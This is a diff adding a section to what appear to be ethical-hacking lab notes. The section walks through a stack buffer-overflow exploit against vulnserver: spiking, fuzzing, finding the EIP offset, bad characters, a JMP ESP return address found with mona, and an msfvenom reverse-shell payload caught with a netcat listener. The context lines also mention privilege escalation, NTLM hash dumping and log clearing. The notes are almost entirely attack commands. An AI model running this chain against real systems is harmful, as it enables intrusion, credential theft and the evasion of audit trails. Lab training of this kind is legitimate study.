@@ -35,13 +35,74 @@
 17. getsystem -t 1  [using named pipe impersonation technique for escalating privileges]
 18. getuid >> sysinfo >> run post/windows/gather/smart_hashdump (extracts the NTLM hashes)  >> clearev(clearing logs)
 
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+# Perform Buffer Overflow Attack to Gain Access to a Remote System
+--------------------------------------------------------------------
 
+nc -nc 10.10.1.11 9999 (connect vulnserver.exe to parrot machine netcat listner)   >> HELP   >> EXIT
 
+1. spiking   
 
+   >> trun.spk 
 
+   >> (pluma trun.spk)
 
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+   >>  s_readline();
+       s_string(“TRUN ”);
+       s_string_variable(“0”);
+   
+   >>  generic_send_tcp 10.10.1.11 9999 trun.spk 0 0
+
+2. fuzzing(Scripts)  
+
+   >> ./fuzz.py(after #chmod +x fuzz.py)
+
+3. >>  /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 11900   --> (It will generate a random piece of bytes)
+
+   >>  pluma findoff.py (to add random bytes in offset variable)
+  
+   >>  ./findoff.py --> (When the above script is executed, it sends random bytes of data to the target vulnerable server, which causes a buffer overflow in the stack.)
+
+   >>  /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 11900 -q 386F4337 --> (A result appears, indicating that the identified EIP register is at an offset of 2003 bytes)
+
+4. >>  ./overwrite.py  (the Python script to send the generated random bytes to the vulnerable server.This Python script is used to check whether we can control the EIP register.)
+
+5. >>  ./badchars.py  (identify bad characters that may cause issues in the shellcode.) [Characters such as no byte, i.e., “\x00”, are badchars.]
+
+6. >> mona.py (we need to identify the right module of the vulnerable server that is lacking memory protection. In Immunity Debugger, you can use scripts such as mona.py to identify modules that lack memory protection.)
+
+   >> !mona modules (immunity debugger text field present at the bottom of the immunity debugger window)[observe that there is no memory protection for the module essfunc.dll]
+
+   >> /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb (This script is used to convert assembly language into hex code.)	[parrot Securtity]
+   
+   >> The nasm command line appears; type JMP ESP and press Enter.         [parrot Securtity]
+
+   >> The result appears, displaying the hex code of JMP ESP (here, FFE4).       [parrot Securtity]  
+
+   >> Type EXIT and press Enter to stop the script.
+
+   >> In the Immunity Debugger window, type !mona find -s “\xff\xe4” -m essfunc.dll and press Enter. [Here, the return address of the vulnerable module is 0x625011af.]
+
+7. >> Re-launch both Immunity Debugger and the vulnerable server as an administrator. Now, Attach the vulnserver process to Immunity Debugger.
+   >> In the Immunity Debugger window, click the Go to address in Disassembler icon.
+   >> The Enter expression to follow pop-up appears; enter the identified return address in the text box (here, 625011af) and click OK.
+   >> You will be pointed to 625011af ESP; press F2 to set up a breakpoint at the selected address.
+   >> Now, click on the Run program in the toolbar to run Immunity Debugger.
+   >> ./jump.py
+
+8. >> msfvenom -p windows/shell_reverse_tcp LHOST=[Local IP Address] LPORT=[Listening Port] EXITFUNC=thread -f c -a x86 -b “\x00”  (generate a shell code, copy code and paste in shellcode.py(overflow variable, line no 4))
+
+   >>  pluma shellcode.py (paste shell code in overflow variable[line no 4] and save it and close it .)
+
+   >>  nc -nvlp 4444
+
+   >>  chmod +x shellcode.py
+
+   >>  ./shellcode.py
+
+   >>  #whoami                  [*** GAME OVER ***]
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Escalate Privileges in Linux Machine by Exploiting Misconfigured NFS(Network File System) :-
 --------------------------------------------------------------------------------------------
